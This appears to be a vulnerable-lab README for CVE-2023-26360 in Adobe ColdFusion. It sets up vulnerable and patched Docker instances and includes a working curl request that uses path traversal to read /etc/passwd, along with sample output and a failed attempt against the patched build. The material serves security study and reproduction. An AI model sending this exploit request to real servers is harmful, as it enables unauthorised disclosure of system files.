# Adobe ColdFusion: Local File Inclusion Leads to RCE (CVE-2023-26360)

Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.

Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by an Improper Access Control vulnerability that could result in local file inclusion and arbitrary code execution in the context of the current user.

## Vulnerable Version
### Setup
Start a Adobe ColdFusion 2018.0.15:

```bash
docker compose -f docker-compose-vuln.yml up -d
```

After a few minutes wait, visit `http://127.0.0.1:8500/CFIDE/administrator/index.cfm` with password `vulhub` check if  Adobe ColdFusion has installed successfully.

If it is still not working, please reset the password manually:
```bash
docker compose up -d
docker compose ps # grab name of the container <container_name>
docker exec  -it <container_name> bash
cd /opt/coldfusion/cfusion/bin
sh passwordreset.sh
# press 1 -> insert new password ( 4 times )
sh cfstop.sh
sh cfstart.sh
# exit container (C-d)
```

### Exploit 

Send the following request to the server to retrieve `/etc/passwd`:

```bash
curl -X POST "http://127.0.0.1:8500/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true" \
     -H "Host: 127.0.0.1:8500" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "_variables={\"_metadata\":{\"classname\":\"../../../../../../../../etc/passwd\"}}"
```

The output would be the contents of `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
cfuser:x:999:999::/home/cfuser:/bin/sh
<SNIP>
```

## Safe Version 
### Setup
Start a Adobe ColdFusion 2018.0.15:

```bash
docker compose -f docker-compose-safe.yml up -d
```

After a few minutes wait, visit `http://127.0.0.1:8500/CFIDE/administrator/index.cfm` with password `vulhub` check if  Adobe ColdFusion has installed successfully.

If it is still not working, please reset the password manually:
```bash
docker compose up -d
docker compose ps # grab name of the container <container_name>
docker exec  -it <container_name> bash
cd /opt/coldfusion/cfusion/bin
sh passwordreset.sh
# press 1 -> insert new password ( 4 times )
sh cfstop.sh
sh cfstart.sh
# exit container (C-d)
```

### Unsuccessful Exploit 

Send the following request to the server to attempt to retrieve `/etc/passwd`:

```bash
curl -X POST "http://127.0.0.1:8500/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true" \
     -H "Host: 127.0.0.1:8500" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "_variables={\"_metadata\":{\"classname\":\"../../../../../../../../etc/passwd\"}}"
```

The vulnerability has been patched and the output no longer discloses the requested file's content:

```html
<!-- " ---></TD></TD></TD></TH></TH></TH></TR></TR></TR></TABLE></TABLE></TABLE></A></ABBREV></ACRONYM></ADDRESS></APPLET></AU></B></BANNER></BIG></BLINK></BLOCKQUOTE></BQ></CAPTION></CENTER></CITE></CODE></COMMENT></DEL></DFN></DIR></DIV></DL></EM></FIG></FN></FONT></FORM></FRAME></FRAMESET></H1></H2></H3></H4></H5></H6></HEAD></I></INS></KBD></LISTING></MAP></MARQUEE></MENU></MULTICOL></NOBR></NOFRAMES></NOSCRIPT></NOTE></OL></P></PARAM></PERSON></PLAINTEXT></PRE></Q></S></SAMP></SCRIPT></SELECT></SMALL></STRIKE></STRONG></SUB></SUP></TABLE></TD></TEXTAREA></TH></TITLE></TR></TT></U></UL></VAR></WBR></XMP>
<font face="arial"></font>
<html>
   <head>
      <title>Error Occurred While Processing Request</title>
      <SNIP>
```

Credit: 
- https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2023-26360/README.md

References:

- <https://xz.aliyun.com/t/13392>
